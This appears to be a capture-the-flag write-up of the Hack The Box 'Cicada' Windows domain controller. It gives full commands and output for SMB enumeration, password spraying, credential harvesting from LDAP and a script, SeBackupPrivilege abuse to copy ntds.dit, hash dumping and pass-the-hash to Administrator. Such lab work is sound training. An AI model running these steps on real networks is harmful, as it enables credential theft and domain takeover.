# Machine Name: Cicada  
# Machine IP:   
# Difficulty: Easy  
# Type: Windows  

First of all we started by scanning for open ports:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ rustscan -a 10.129.3.47  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.3.47:53
Open 10.129.3.47:88
Open 10.129.3.47:135
Open 10.129.3.47:139
Open 10.129.3.47:389
Open 10.129.3.47:445
Open 10.129.3.47:464
Open 10.129.3.47:636
Open 10.129.3.47:3268
Open 10.129.3.47:3269
Open 10.129.3.47:5985
```
Let's look at the shared folders to find any public but sensitive information:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbclient -L //10.129.3.47/ -N               

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
We accessed the DEV share but cannot see its content, we dont have permission to do. So, lets check the HR folder.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbclient //10.129.3.47/HR -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 16:29:09 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (4.0 KiloBytes/sec) (average 4.0 KiloBytes/sec)
smb: \> exit
```
Just look at its content. It simply says that "Hey you are new employee and we set default password to you **(Cicada$M6Corpb*@Lp#nZp!8)**. Just change it immediately". It gives us a hint. Maybe there are other users that were set by this default password but don't change it.     
That is why I decided to fetch all the users and check this password on them. Because I couldn't do anything with this user. It is a guest user and I proved it by this command:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec smb 10.129.3.47 -u Cicada -p 'Cicada$M6Corpb*@Lp#nZp!8' 
SMB         10.129.3.47     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.47     445    CICADA-DC        [+] cicada.htb\Cicada:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
```
We couldn't send ldap requests for enumerating users. I checked kerbrute and it was slow because of the large scope of the wordlist. So, I decided to use impacket tool --> **impacket-lookupsid**   
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```
* -no-pass means dont use password for connecting. It works for the guest user because it is considered as null session.  

----
After gathering the usernames, we can bruteforce the default password for them:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec smb 10.129.3.47 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' | grep [+] 
SMB                      10.129.3.47     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
Only the **'michael.wrightson'** user has this default password. I checked smb shares, winrm but none of them gave any essential hint. So, I remembered that in the previous users, we were guest it means we weren't the authenticated domain user.     
So, I couldn't send ldap queries. But now, I can look at the user's description fields by the help of ldap. Because sometimes there can be forgotten passwords.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec ldap 10.129.3.47 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
LDAP        10.129.3.47     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.3.47     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.3.47     389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.3.47     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.3.47     389    CICADA-DC        Administrator                 2024-08-27 00:08:03 1        Built-in account for administering the computer/domain      
LDAP        10.129.3.47     389    CICADA-DC        Guest                         2024-08-28 21:26:56 0        Built-in account for guest access to the computer/domain    
LDAP        10.129.3.47     389    CICADA-DC        krbtgt                        2024-03-14 15:14:10 1        Key Distribution Center Service Account                     
LDAP        10.129.3.47     389    CICADA-DC        john.smoulder                 2024-03-14 16:17:29 1                                                                    
LDAP        10.129.3.47     389    CICADA-DC        sarah.dantelia                2024-03-14 16:17:29 1                                                                    
LDAP        10.129.3.47     389    CICADA-DC        michael.wrightson             2024-03-14 16:17:29 0                                                                    
LDAP        10.129.3.47     389    CICADA-DC        david.orelious                2024-03-14 16:17:29 0        Just in case I forget my password is aRt$Lp#7t*VQ!3         
LDAP        10.129.3.47     389    CICADA-DC        emily.oscars                  2024-08-23 01:20:17 0
```
Yeahh, we have the password of **'david.orelious'** user !!!!      

----

Now, we should check which shares are readable for that user. Just use smbmap for it:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbmap -H cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3'       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.231.149:445	Name: cicada.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DEV                                               	READ ONLY	
	HR                                                	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share
```

Yeah, DEV folder can be read now. Lets look through it.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 16:31:39 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 21:28:22 2024

		4168447 blocks of size 4096. 459615 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                             
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
We have a new username (emily.oscars) and its password (Q!3@Lp#M6b*7t*Vt). I checked smb shares for that user and saw that it has access to ADMIN$ and C$ shares which means it is high-privileged user. But I couldn't get crucial information from these shares. So, I used evil-winrm to connect this user from remote.     
```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
I read the user.txt in the Desktop of that user. But I don't have permission to read the root.txt file in the Administrator's Desktop folder. Let's look at this user's privileges:   
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Woww, It is a big hint to us. **"SeBackupPrivilege"** privilege means that, we can read all the files in the system. Because to create their backup, it is required. But in windows systems we cannot do it directly. So, we will use **"diskshadow"**.      

## 1. What is Diskshadow?  
In a running Windows system, the **ntds.dit** file (which holds all domain passwords) is locked because the system is constantly using it. You cannot copy it normally.    
Diskshadow is a built-in Windows tool that uses **VSS (Volume Shadow Copy Service)**. It creates a "snapshot" (a frozen photo) of the entire drive. In this snapshot, the files are not locked, so you can copy them. Let's create a to do list for diskshadow.     
```bash
Set-Content -Path C:\Windows\Temp\shadow.txt -Value "set metadata C:\Windows\Temp\meta.cab`r`nset context persistent nowriters`r`nadd volume c: alias ntds_shadow`r`ncreate`r`nexpose %ntds_shadow% z:" -Encoding ASCII
```
* set context persistent nowriters: Tells Windows to make a stable copy that doesn't disappear immediately.  
* add volume c: alias ntds_shadow: Selects the C: drive to be copied and gives it a nickname.  
* create: Tells the system to actually take the snapshot now.  
* expose %ntds_shadow% z:: This is the magic part. It takes the frozen snapshot and makes it appear as a new drive letter (Z:). Now, the "unlocked" version of the password database is sitting on the Z: drive.  
```bash
diskshadow /s C:\Windows\Temp\shadow.txt
```
* /s (Script): This runs your to-do list automatically. After this finishes, you will see a Z: drive on the system.  
```bash
robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
```
* robocopy: A powerful copy tool.  
* /b (Backup mode): This is why your SeBackupPrivilege is important. This flag tells Windows: "I am a backup operator, ignore all security restrictions and let me copy this file." It copies the database from the Z: drive to your Temp folder.  
```bash
reg save hklm\system system.bak
```
* The ntds.dit file is encrypted. The "key" to unlock it is stored in the Windows Registry. This command saves that key into a file called system.bak.    
The last thing we need is to download ntds.dit and system.bak file from the target windows machine to our kali.     
```bash
copy C:\Windows\Temp\ntds.dit .
download ntds.dit
download system.bak
```

----
Now, we have these files in our kali. Let's get all the NTLM hashes of the users. We currenctly need only the Administrator hash.      
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL                                
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
```
Let's access the system as Administrator:    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
And BINGOO!!! We got the root.txt flag from the Desktop folder of Administrator user.   
























































